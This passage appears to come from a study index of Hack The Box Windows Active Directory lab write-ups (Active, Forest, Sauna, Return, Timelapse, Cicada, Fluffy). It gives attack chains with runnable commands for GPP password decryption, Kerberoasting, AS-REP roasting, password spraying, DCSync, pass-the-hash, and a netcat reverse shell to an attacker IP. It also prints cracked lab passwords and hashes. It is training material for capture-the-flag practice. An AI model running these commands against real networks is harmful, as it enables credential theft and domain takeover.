Open the PDF around page **8** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 24- Active

**Target:** Windows / Active Directory · Easy

[Detailed notes](./htb-writeups/Active.md) · [Official PDF](./htb-writeups/Active.pdf)

### Machine path overview

Active is an easy to medium-difficulty Windows machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.

### Remote enumeration and foothold checks

- Test a true SMB null session and enumerate every share; the nondefault Replication share is readable anonymously.
- Recursively download/browse the domain policy tree under Replication and inspect Groups.xml rather than stopping at share names.
- Extract the Group Policy Preferences cpassword from Groups.xml and decrypt it with gpp-decrypt to recover the SVC_TGS credential.
- Re-enumerate SMB with SVC_TGS and retrieve the user flag/files available to the authenticated account.
- Stay on the anonymous Replication/SYSVOL -> GPP `cpassword` -> authenticated Kerberoast path; LAPS password retrieval is not part of Active.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Search SYSVOL/NETLOGON for Group Policy Preference XML files and decrypt any `cpassword`; then test the recovered credential on SMB/WinRM and for Kerberoasting.

### Post-foothold local enumeration and lateral movement

- With the valid domain credential, request SPN tickets using GetUserSPNs rather than assuming the service account itself is the final target.
- The Administrator account has an SPN suitable for Kerberoasting; save the TGS hash in the correct format and crack it offline.
- Validate the cracked Administrator password against SMB before selecting a remote-execution method.

### User path

**Memory chain:** anonymous SMB access → GPP cpassword recovery → password decryption → SMB access as SVC_TGS

- Microsoft DNS 6.1 is running, which allows Nmap to fingerprint the domain controller as Windows Server 2008 R2 SP1.
- An example use case is where a company’s gold image had a weak local administrator password, and administrators wanted to retrospectively set it to something stronger.
- The defined password was AES-256 encrypted and stored in Groups.xml .
- However, at some point in 2012, Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low-hanging fruit.
- extract the encrypted password form the Groups.xml file and decrypt it using gpp-decrypt . $ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 The domain account SVC_TGS has the password GPPstillStandingStrong2k18 .

#### Commands and PDF search strings

- `sudo masscan -p1-65535 10.10.10.100 --rate=1000 -e tun0 > ports`
- `nmap -Pn -sV -sC -p$ports 10.10.10.100`
- `Nmap done: 1 IP address (1 host up) scanned in 68.69 seconds`
- `smbclient -L //10.10.10.100`
- `smbmap -H 10.10.10.100`
- `smbclient //10.10.10.100/Replication`
- `smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100`
- `smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users`

### Artifacts and exact search anchors

`active.htb`, `/etc/hosts`, `Groups.xml`, `desktop.ini`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use the cracked Administrator domain credential with PsExec/WMIExec or equivalent SMB remote execution to obtain SYSTEM on the DC.
- Maintain the domain context (ACTIVE\Administrator) and correct target hostname/IP; a local-auth attempt is the wrong authentication mode.
- The full chain is anonymous Replication share -> GPP cpassword -> authenticated Kerberoast -> Administrator remote execution.
- Crack the Administrator TGS to its plaintext password, then use password-authenticated PsExec/WMIExec. This writeup does not recover an Administrator NTLM hash for pass-the-hash.
- Search SYSVOL/NETLOGON for Group Policy Preference XML files and decrypt any `cpassword`; then test the recovered credential on SMB/WinRM and for Kerberoasting.
- With any valid domain credential or ticket, request SPN service tickets (`GetUserSPNs`) and crack them; do not assume the SPN account is obviously privileged.

### Root / Administrator path

**Memory chain:** Kerberoast Administrator SPN → crack Administrator plaintext password → password-authenticated WMIExec/PsExec

- Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password.
- This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running.
- The below image shows the Kerberos authentication process when interacting with a service instance.
- It's important to note that shutting down the server hosting the service does not mitigate the risk, as the attack doesn't rely on communication with the target service.
- Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated with a particular service instance. ldapsearch can be used to identify accounts that are configured with SPNs.

#### Commands and PDF search strings

- `ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b`
- `GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100`
- `GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request`
- `hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable`
- `hashcat (v6.1.1) starting...`

### Artifacts and exact search anchors

`active.htb`, `GetADUsers.py`, `GetUserSPNs.py`, `/usr/share/wordlists/rockyou.txt`, `wmiexec.py`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **6** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 25- Forest

**Target:** Windows / Active Directory · Easy

[Detailed notes](./htb-writeups/Forest.md) · [Official PDF](./htb-writeups/Forest.pdf)

### Machine path overview

Forest is an easy Windows machine that showcases a Domain Controller (DC) for a domain in which Exchange Server has been installed. The DC allows anonymous LDAP binds, which are used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes, compromising the system.

### Remote enumeration and foothold checks

- Test an anonymous LDAP simple bind and query the RootDSE/defaultNamingContext before searching the domain base.
- Enumerate all LDAP user objects and notice the svc-alfresco service account among Exchange-related objects.
- Test every enumerated user for Kerberos pre-authentication disabled with GetNPUsers; svc-alfresco returns an AS-REP hash.
- Crack the AS-REP hash offline and use the recovered svc-alfresco password over WinRM.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Try LDAP with an anonymous simple bind (`ldapsearch -x` / blank user). Request the naming contexts first, then query the discovered base DN for users, groups, descriptions, and memberships.
- Run `windapsearch` with a blank identity; test user enumeration and privileged/remote-management group membership even if the first anonymous query returns little data.
- After finding valid users, test every account for Kerberos pre-authentication disabled (`GetNPUsers`), then crack the returned AS-REP hash offline.

### Post-foothold local enumeration and lateral movement

- Run SharpHound with all collection methods and inspect nested group membership, not only direct groups.
- Recognize svc-alfresco's nested Account Operators membership and the Exchange Windows Permissions group's WriteDACL edge over the domain.
- Account Operators can create/modify a new non-protected user and add it to Exchange Windows Permissions and Remote Management Users.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → group-membership abuse → AS-REP roasting → password cracking → WinRM

- find some usernames and mailbox accounts, meaning Exchange is installed in the domain.
- The query found 313 unique objects, including a service account named svc-alfresco .
- As the TGT contains material encrypted with the user's NTLM hash, we can subject this to an offline brute force attack and attempt to get the password for svc-alfresco .
- The password for this account is revealed to be s3rvice .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.10.10`
- `ldapsearch -x -H ldap://10.10.10.161:389 -b "dc=htb,dc=local"`
- `./windapsearch.py -d htb.local --dc-ip 10.10.10.161 -U`
- `./windapsearch.py -d htb.local --dc-ip 10.10.10.161 --custom "objectClass=*"`
- `impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass`
- `john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt`
- `evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice`
- `Evil-WinRM shell v3.7`

### Artifacts and exact search anchors

`FOREST.htb`, `/etc/hosts`, `windapsearch.py`, `GetNPUsers.py`, `/usr/share/wordlists/rockyou.txt`, `C:\Users\svc-alfresco\Documents`, `C:\Users\svc-alfresco\Desktop\user.txt`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Create a controlled domain user, add it to Exchange Windows Permissions, and give it remote-management access.
- Import PowerView and use the domain WriteDACL path to grant the controlled user DCSync rights with Add-ObjectACL.
- Run secretsdump with the controlled account to retrieve NTDS hashes, then pass the Administrator hash to psexec.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
- Check each SMB share for both read and write access. A writable share may enable file-placement, hash capture, service/task abuse, or an application-triggered payload.

### Root / Administrator path

**Memory chain:** BloodHound path analysis → WinRM → ACL abuse → LDAP enumeration → group-membership abuse → DCSync/secrets dump → password cracking → WMI/PowerShell remoting

- It's found that svc-alfresco is a member of nine groups through nested membership.
- One of the nested groups is found to be Account Operators , which is a privileged AD group.
- The WriteDACL privilege allows a user to add ACLs to an object.
- C:\Windows\system32> The root flag can be obtained from C:\Users\Administrator\Desktop\root.txt .

#### Commands and PDF search strings

- `impacket-secretsdump htb/john@10.10.10.161`
- `impacket-psexec administrator@10.10.10.161 -hashes`

### Artifacts and exact search anchors

`C:\Users\svc-alfresco\Documents`, `C:\Users\svcalfresco\Documents\SharpHound.exe`, `FOREST.htb`, `20250611080409_BloodHound.zip`, `C:\Users\svc-alfresco\Documents\20250611080409_BloodHound.zip to`, `PowerView.ps1`, `/home/fury/labs/forest/PowerView.ps1`, `C:\Users\svcalfresco\Documents\PowerView.ps1`, `C:\Windows\system32`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **5** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 26- Sauna

**Target:** Windows / Active Directory · Easy

[Detailed notes](./htb-writeups/Sauna.md) · [Official PDF](./htb-writeups/Sauna.pdf)

### Machine path overview

Sauna is an easy diﬃculty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn't require Kerberos pre-authentication. This hash can be subjected to an oﬄine brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been conﬁgured to automatically login and it identiﬁes their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the DS-Replication-Get-ChangesAll extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket's psexec.py in order to gain a shell on the box as NT_AUTHORITY\SYSTEM .

### Remote enumeration and foothold checks

- Scrape employee full names from the public website and generate several realistic AD username formats; the usernames are not directly listed.
- Test anonymous LDAP and SMB, but do not abandon the path when anonymous LDAP binds yet returns no useful objects.
- Feed the generated username list to GetNPUsers for AS-REP roasting; fsmith has Kerberos pre-authentication disabled.
- Crack the AS-REP hash and use fsmith's password through WinRM.
- Try LDAP with an anonymous simple bind (`ldapsearch -x` / blank user). Request the naming contexts first, then query the discovered base DN for users, groups, descriptions, and memberships.
- Run `windapsearch` with a blank identity; test user enumeration and privileged/remote-management group membership even if the first anonymous query returns little data.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- After finding valid users, test every account for Kerberos pre-authentication disabled (`GetNPUsers`), then crack the returned AS-REP hash offline.

### Post-foothold local enumeration and lateral movement

- Run WinPEAS and inspect registry/autologon findings, not only services; it exposes the svc_loanmgr account's plaintext password.
- Confirm svc_loanmgr can also use WinRM, then collect/analyze BloodHound data under the new identity.
- Inspect effective ACL rights and notice svc_loanmgr has DS-Replication-Get-Changes/All over the domain.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → directory/file discovery → AS-REP roasting → password cracking → WinRM

- The Key Distribution Center (KDC) of the Domain Controller will check the authentication service request (AS-REQ), verify the user information and return an encrypted Ticket Granting Ticket (TGT).
- A hash can be derived from this, that can be subjected to an oﬄine brute force attack in order to reveal the plaintext password.
- A simple bash command can be used to execute this attack, and iterate through the usernames in unames.txt . while read p; do GetNPUsers.py egotistical-bank.local/"$p" -request -no-pass dc-ip 10.10.10.175 >> hash.txt; done < unames.txt GetNPUsers.py returns a hash for user fsmith .
- can save the hash into a ﬁle, and determine the correct hash mode for ASREPRoasting. hashcat --help | grep Kerberos We choose Kerberos 5 AS-REP etype 23 , i,e. mode 18200 .
- Next, run hashcat specifying this mode and the rockyou.txt wordlist. hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force After some seconds the password is found.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.10.175`
- `./windapsearch.py -d egotistical-bank.local --dc-ip 10.10.10.175 -U`
- `./ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.175/FUZZ`
- `hashcat --help | grep Kerberos`
- `hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force`
- `evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'`

### Artifacts and exact search anchors

`windapsearch.py`, `GetADUsers.py`, `/usr/share/wordlists/dirb/common.txt`, `GetNPUsers.py`, `/usr/share/wordlists/rockyou.txt`, `C:\Users\Fsmith\Desktop\`

Open the PDF around page **7** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use svc_loanmgr's replication rights for a DCSync/secretsdump request targeting the domain Administrator.
- Pass the retrieved Administrator NTLM hash to psexec for NT AUTHORITY\SYSTEM.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.

### Root / Administrator path

**Memory chain:** WinRM → BloodHound path analysis → DCSync/secrets dump → WMI/PowerShell remoting

- The script reveals that the user EGOTISTICALBANK\svc_loanmanager has been set to automatically log in, and this account has the password Moneymakestheworldgoround! .
- Then, we can run bloodhound to visualise any available attack paths. sudo apt install bloodhound sudo pip install bloodhound-python bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICALBANK.LOCAL -ns 10.10.10.175 -c All Start neo4j server. neo4j console Then type bloodhound to access the BloodHound UI.
- On the Queries tab, click on Find Principals with DCSync Rights .
- After right-clicking on the edge and clicking Help , we see that svc_loanmgr is capable of dumping password hashes from the Domain Controller by using a DCSync attack.
- This script will reveal the NTLM hashes for all domain users, using the replication privileges.

#### Commands and PDF search strings

- `evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`
- `sudo pip install bloodhound-python`
- `bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICALBANK.LOCAL -ns 10.10.10.175 -c All`
- `secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user`

### Artifacts and exact search anchors

`C:\Users\ con`, `info.zip`, `secretsdump.py`, `psexec.py`, `C:\Users\Administrator\Desktop\`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 27- Return

**Target:** Windows / Active Directory · Easy

[Detailed notes](./htb-writeups/Return.md) · [Official PDF](./htb-writeups/Return.pdf)

### Machine path overview

Return is an easy difficulty Windows machine featuring a network printer administration panel that stores LDAP credentials. These credentials can be captured by inputting a malicious LDAP server which allows obtaining foothold on the server through the WinRM service. User found to be part of a privilege group which further exploited to gain system access.

### Remote enumeration and foothold checks

- Confirm SMB null/guest access is not useful, then inspect the IIS network-printer administration panel.
- The printer settings contain an LDAP server field and pre-filled service-account username; change the server address to the attacker IP.
- Listen on TCP/389 with netcat before submitting the printer settings so the device sends the LDAP bind password in cleartext.
- Use the captured svc-printer credential over WinRM.
- Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
- Test SMB/RPC as `guest` with no password as a separate case from a blank null session. Use it for share listing and SID/RID enumeration even if file access is limited.

### Post-foothold local enumeration and lateral movement

- Run whoami /groups and identify membership in Server Operators, not just the standard token privileges.
- Server Operators can reconfigure services even without being a local Administrator; select a service such as VSS that can be safely stopped/started.

### User path

**Memory chain:** SMB enumeration → LDAP enumeration → WinRM

- SMB does not allow NULL or guest sessions, so can turn our attention to the website.
- IIS This reveals a printer admin panel, such as you find on enterprise Canon, Xerox and Epson multifunction devices.
- Navigating to Settings reveals a username and domain name.
- These configuration pages typically allow the domain controller or file server to be specified.
- connect to the service using evil-winrm tool. gem install evil-winrm evil-winrm -i 10.10.10.233 -u svc-printer -p '1edFg43012!!'

#### Commands and PDF search strings

- `nmap -p$ports -sV -sC 10.10.10.233`
- `sudo nc -lvnp 389`
- `evil-winrm -i 10.10.10.233 -u svc-printer -p '1edFg43012!!'`

### Artifacts and exact search anchors

No stable artifact was extracted automatically; use the decision checks and commands.

Open the PDF around page **3** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Upload a callback executable/netcat payload to a writable location.
- Use sc.exe config to replace the VSS service binPath with the payload, then stop and start VSS.
- Catch the callback as SYSTEM; restore service configuration afterward if maintaining a clean lab state.

### Root / Administrator path

**Memory chain:** group-membership abuse → service abuse → reverse shell → WinRM → file upload abuse

- Enumerating group memberships reveals that svc-printer is part of Server Operators group.
- A more efficient way would be to obtain a meterpreter shell and then quickly migrate to a more stable process.
- Choose an appropriate process which is running as NT AUTHORITY\SYSTEM and migrate to it.
- In this case, we will be migrating to the process with PID 3172. migrate <PID> We can now spawn a shell and grab the root flag. shell

#### Commands and PDF search strings

- `Select the multi/handler exploit module, which is used to listen for incoming connections from a`

### Artifacts and exact search anchors

`/usr/share/windows-resources/binaries/nc.exe`, `C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2`, `C:\Users\svc-printer\Desktop\shell.exe`

Open the PDF around page **4** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 28- Timelapse

**Target:** Windows / Active Directory · Easy

[Detailed notes](./htb-writeups/Timelapse.md) · [Official PDF](./htb-writeups/Timelapse.pdf)

### Machine path overview

Timelapse is an Easy Windows which involves accessing a publicly accessible SMB share containing a zip file with a PFX key. This zip file requires a password, which can be cracked by using John. Extracting the zip file shows it contains a password encrypted PFX file which can be gathered with John as well by converting the PFX file to a hash format readable by John. From the PFX file an SSL certificate and a private key can be extracted which is used for logging in with WinRM. After authentication we discover a PowerShell history file containing login credentials for svc_deploy user. User enumeration shows that svc_deploy is part of a group named LAPS_Readers . The LAPS_Readers group has the ability to manage passwords in LAPS, which allows any user from this group to read the local passwords for machines in the domain so by abusing this trust we retrieve the password for Administrator and gain a WinRM session.

### Remote enumeration and foothold checks

- List SMB shares without credentials and recursively inspect the non-default Shares share.
- Download winrm_backup.zip from the Dev folder; use zip2john/John because the archive is password protected.
- The archive contains legacyy_dev_auth.pfx; convert the PFX with pfx2john and crack its separate import password.
- Use OpenSSL to extract both the client certificate and private key, then authenticate to WinRM with certificate/key options rather than a password.
- If the Python 3 pfx2john output includes literal b'...' wrappers, strip those wrappers before giving the hash to John; otherwise the valid PFX hash may not parse/crack.
- Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Read PowerShell history for commands and credentials, then test whether the discovered account enables lateral movement or privileged remote access.

### Post-foothold local enumeration and lateral movement

- Read legacyy's PSReadLine ConsoleHost_history.txt; it contains a command with svc_deploy credentials.
- Enumerate svc_deploy's group membership and notice LAPS_Readers.
- Move to svc_deploy before attempting LAPS attribute reads; legacyy does not have that right.

### User path

**Memory chain:** SMB share enumeration → protected-archive cracking → PFX/certificate-key recovery → WinRM

- Trying to unzip the file requires a password which we don't have at this moment.
- PFX files can be used by WinRM in order to login without a password.
- extract them from the file. openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes The output above shows that we need a different password than supremelegacy .
- Utilizing the pfx2john utility we convert the pfx file into a hash format then use John to crack the password.
- Since Evil-WinRM allows us to pass a key and certificate using the -c and -k flags we can pass the certificate and key and authenticate to the target.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.166`
- `smbclient -L //10.10.11.152/`
- `smbclient //10.10.11.152/Shares`
- `john zip.john -wordlist:/usr/share/wordlists/rockyou.txt`
- `john pfx.john -wordlist:/usr/share/wordlists/rockyou.txt`
- `Evil-WinRM allows us to pass a key and certificate using the -c and -k flags we can pass the`
- `evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S`
- `evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S`

### Artifacts and exact search anchors

`timelapse.htb`, `winrm_backup.zip`, `/usr/share/wordlists/rockyou.txt`, `legacyy_dev_auth.pfx`, `key.pem`, `/usr/share/john/pfx2john.py`, `pfx2john.py`, `cert.pem`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Import the LAPS/AdmPwd PowerShell module if necessary and query the DC computer object for its managed local Administrator password.
- Use the retrieved host-specific LAPS password as the local Administrator over WinRM.
- Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.

### Root / Administrator path

**Memory chain:** PowerShell history secrets → lateral movement → LAPS password retrieval → WinRM as Administrator

- The "Local Administrator Password Solution" (LAPS) is used to manage local account passwords of Active Directory computers.
- There is a PowerShell module that can be used to retrieve this password which can be found on github named AdmPwd.PS.
- Find-AdmPwdExtendedRights -identity * From the output we can see Domain Controllers.
- look at the right holders to see if we are able to manage the password.
- Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders The output of the previous command shows that the LAPS_Readers group has delegation over Domain Controllers which allows us to read the password for users in this object.

#### Commands and PDF search strings

- `get-admpwdpassword -computername dc01 | Select password`
- `evil-winrm -i 10.10.11.152 -u administrator -p '/1B@QZe3{BAAwzs%KY$pTb7d' -S`

### Artifacts and exact search anchors

No stable artifact was extracted automatically; use the decision checks and commands.

Open the PDF around page **5** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 29- Cicada

**Target:** Windows / Active Directory · Easy

[Detailed notes](./htb-writeups/Cicada.md) · [Official PDF](./htb-writeups/Cicada.pdf)

### Machine path overview

Cicada is an easy-difficult Windows machine that focuses on beginner Active Directory enumeration and exploitation. In this machine, players will enumerate the domain, identify users, navigate shares, uncover plaintext passwords stored in files, execute a password spray, and use the SeBackupPrivilege to achieve full system compromise.

### Remote enumeration and foothold checks

- Test SMB as guest with a blank password separately from a blank null session; guest can list/read shares.
- Read the HR share's Notice from HR file and capture the onboarding/default password embedded in it.
- Run impacket-lookupsid as cicada.htb/guest with -no-pass; filter SidTypeUser results into a clean username list.
- Password-spray the default password across the RID-derived users and then re-enumerate shares under every successful identity.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
- Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.
- Perform RID/SID cycling with `impacket-lookupsid`; save only `SidTypeUser` names for spraying. Try null, guest, and any low-privilege credential because each may expose different ranges.
- Test SMB/RPC as `guest` with no password as a separate case from a blank null session. Use it for share listing and SID/RID enumeration even if file access is limited.
- Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Post-foothold local enumeration and lateral movement

- A newly valid user can access DEV; download and inspect Backup_script.ps1 rather than stopping after the first successful login.
- The backup script contains another user's plaintext credential; use that identity for WinRM and the user flag.
- Immediately run whoami /priv and note both SeBackupPrivilege and SeRestorePrivilege are enabled.

### User path

**Memory chain:** LDAP enumeration → subdomain enumeration → SMB enumeration → default credentials → password cracking → password spraying → WinRM

- Please do not share your password with anyone, and ensure you use a complex password.
- Best regards, Cicada Corp Lookupsid Now that we have found this password we could try checking to see if any accounts are still using this password.
- Then, we will pass the items into a file called users.txt . impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt Now, we can conduct a password spray to test if any users still have the default password we found.
- Our user.txt file should contain the following users: cat users.txt Administrator Guest krbtgt CICADA-DC$ john.smoulder sarah.dantelia michael.wrightson david.orelious emily.oscars Password Spraying To execute our password spray attack, we will again use crackmapexec .
- Backup file saved to: $backupFilePath" Since we have new credentials, we can try to use them to get a shell on the machine.

#### Commands and PDF search strings

- `nmap -sC -sV -Pn 10.10.11.35`
- `crackmapexec smb cicada.htb --shares`
- `crackmapexec smb cicada.htb -u 'guest' -p '' --shares`
- `smbclient //cicada.htb/HR`
- `impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass`
- `impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' |`
- `crackmapexec smb cicada.htb -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'`
- `crackmapexec smb cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -users`
- `crackmapexec smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares`
- `smbclient //cicada.htb/DEV -U`
- `Evil-WinRM and see if the credentials we found work.`
- `evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb`
- `Evil-WinRM shell v3.5`

### Artifacts and exact search anchors

`cicada.htb`, `CICADA-DC.cicada.htb`, `/etc/hosts`, `Backup_script.ps1`, `C:\smb directory and saves it to D`, `C:\smb`, `D:\Backup`, `dateStamp.zip`, `C:\Users\emily.oscars.CICADA\Documents`, `C:\Users\emily.oscars.CICADA\Desktop to find the user flag`

Open the PDF around page **7** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use backup semantics/registry save to copy the protected SAM and SYSTEM hives despite normal ACLs.
- Download both hives and run secretsdump locally to derive local account hashes.
- Pass the local Administrator NTLM hash to WinRM.
- With SeBackup, use backup semantics (for example DiskShadow/robocopy or BackupOperator tooling) to copy SAM/SYSTEM or NTDS/SYSTEM, then extract hashes offline.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.

### Root / Administrator path

**Memory chain:** WinRM → SeBackup abuse → SeRestore abuse → registry secrets → group-membership abuse → DCSync/secrets dump → password cracking → pass-the-hash

- can then use the Administrator hash to authenticate instead of a plaintext password.
- The SYSTEM hive contains system-wide configuration settings, such as the system boot key required to decrypt the password hashes stored in SAM .
- The NTLM hash represents a cryptographic version of a user's plaintext password.
- Once retrieved, we could try to crack the hash or use it in a Pass-the-Hash attack to authenticate directly to the system without needing a plaintext password.
- In the output, we find the Administrator NTLM hash 2b87e7c93a3e8a0ea4a581937016f341 .

#### Commands and PDF search strings

- `impacket-secretsdump -sam sam -system system local`
- `evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb`
- `Evil-WinRM shell v3.5`

### Artifacts and exact search anchors

`C:\Users\emily.oscars.CICADA\Desktop`, `C:\Users\emily.oscars.CICADA\Desktop\sam to sam`, `C:\Users\emily.oscars.CICADA\Desktop\system to system`, `cicada.htb`, `C:\Users\Administrator\Documents`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **9** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 30- Fluffy

**Target:** Windows / Active Directory · Easy

[Detailed notes](./htb-writeups/Fluffy.md) · [Official PDF](./htb-writeups/Fluffy.pdf)

### Machine path overview

Fluffy is an easy-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. By exploiting CVE-2025-24071, the credentials of another low-privileged user can be obtained. Further enumeration reveals the existence of ACLs over the winrm_svc and ca_svc accounts. WinRM can then be used to log in to the target using the winrc_svc account. Exploitation of an Active Directory Certificate service ( ESC16 ) using the ca_svc account is required to obtain access to the Administrator account.

### Remote enumeration and foothold checks

- Enumerate the provided low-privilege SMB credential and identify a writable share containing Upgrade_Notice.pdf.
- Read the notice; its vulnerability table points to CVE-2025-24071 rather than merely providing business context.
- Place a crafted ZIP/.library-ms payload in the writable share and run Responder before the victim extracts it.
- Crack p.agila's captured NTLMv2 response and collect BloodHound data with the recovered plaintext credential.
- Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Check each SMB share for both read and write access. A writable share may enable file-placement, hash capture, service/task abuse, or an application-triggered payload.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
